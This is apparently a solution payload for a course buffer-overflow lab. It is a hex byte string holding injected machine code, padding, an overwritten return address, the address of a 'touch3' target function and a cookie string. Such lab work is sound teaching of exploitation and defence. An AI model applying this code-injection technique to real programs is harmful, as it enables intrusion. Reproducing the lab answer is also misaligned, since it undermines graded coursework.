48 c7 c7 00 42 68 55 48 c7 c6 09 42 68 55 c3 00  /* %rsp + 0x88 , %rsp + 0x91 */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00     /* buffer size */
78 41 68 55 00 00 00 00     /* address of rsp */
34 1c 40 00 00 00 00 00     /* touch3 */
34 65 39 39 63 62 31 62 00  /* str(cookie) */
e8 13 00 00 55 13 00 00     /* array[i] = ascii(cookie[i])*ascii(cookie[7-i]) */
d2 15 00 00 0b 16 00 00
0b 16 00 00 d2 15 00 00
55 13 00 00 e8 13 00 00
